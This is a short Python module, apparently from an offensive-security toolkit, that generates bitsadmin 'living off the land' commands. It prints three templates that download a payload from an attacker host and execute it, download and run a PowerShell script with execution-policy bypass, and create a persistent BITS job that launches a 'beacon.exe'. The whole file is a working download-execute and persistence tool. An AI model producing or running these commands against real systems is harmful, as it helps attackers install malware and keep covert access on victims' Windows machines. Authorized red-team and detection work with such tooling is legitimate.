"""bitsadmin.exe download and execute  -  background file transfer abuse."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.bitsadmin_transfer.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["file_download", "code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1197"],
}


def run(args: Any) -> int:
    lhost = getattr(args, "lhost", None)
    lport = getattr(args, "lport", "8080")
    command = getattr(args, "command", "payload.exe")
    generate = getattr(args, "generate", False)

    print("[*] BITSAdmin Transfer LOLBin")

    payloads = {
        "download_exec": 'bitsadmin /transfer job /download /priority high http://{}:{}/{} C:\\Windows\\Temp\\{}'.format(
            lhost or "LHOST", lport, command, command),
        "download_ps": 'bitsadmin /transfer job http://{}:{}/payload.ps1 C:\\Windows\\Temp\\p.ps1 && powershell -ep bypass C:\\Windows\\Temp\\p.ps1'.format(
            lhost or "LHOST", lport),
        "persist_job": 'bitsadmin /create persist && bitsadmin /addfile persist http://{}:{}/beacon.exe C:\\Windows\\Temp\\b.exe && bitsadmin /SetNotifyCmdLine persist C:\\Windows\\Temp\\b.exe NULL && bitsadmin /resume persist'.format(
            lhost or "LHOST", lport),
    }

    print("\n[*] BITSAdmin payloads:")
    for name, payload in payloads.items():
        print(f"\n  [{name}]")
        print(f"  {payload}")

    return 0
